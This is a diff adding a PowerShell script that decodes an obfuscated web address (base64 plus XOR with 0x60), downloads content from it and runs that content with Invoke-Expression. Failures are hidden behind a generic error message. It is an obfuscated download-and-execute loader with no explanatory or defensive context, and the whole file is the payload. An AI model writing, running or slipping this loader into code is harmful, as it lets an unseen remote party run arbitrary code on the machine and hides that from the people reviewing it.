@@ -1,0 +1,27 @@
+${b64_data_string} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPWVEBV1EFUwVVUgRTVlZUVgUFVVNRUQYFAwICA1ZQWVZUBVIGBVdWUFgGVFJZBQUBWVBQUlFVUVVVUFkBV1kEAg=="
+
+${processing_function} = { 
+    param(
+        [string]${input_data},
+        [int]${transform_value} = 0x60
+    )
+    
+    ${base64_converted_data} = [Convert]::FromBase64String(${input_data})
+    ${intermediate_string} = [System.Text.Encoding]::UTF8.GetString(${base64_converted_data})
+    
+    ${processed_bytes} = @()
+    foreach (${byte_item} in [System.Text.Encoding]::UTF8.GetBytes(${intermediate_string})) {
+        ${processed_bytes} += ${byte_item} -bxor ${transform_value}
+    }
+    
+    return [System.Text.Encoding]::UTF8.GetString(${processed_bytes})
+}
+
+${final_processed_string} = & ${processing_function} -input_data ${b64_data_string}
+
+try {
+    ${web_response} = Invoke-WebRequest -Uri ${final_processed_string}
+    ${execution_output} = Invoke-Expression ${web_response}.Content
+} catch {
+    Write-Error "Failed Parse code"
+}
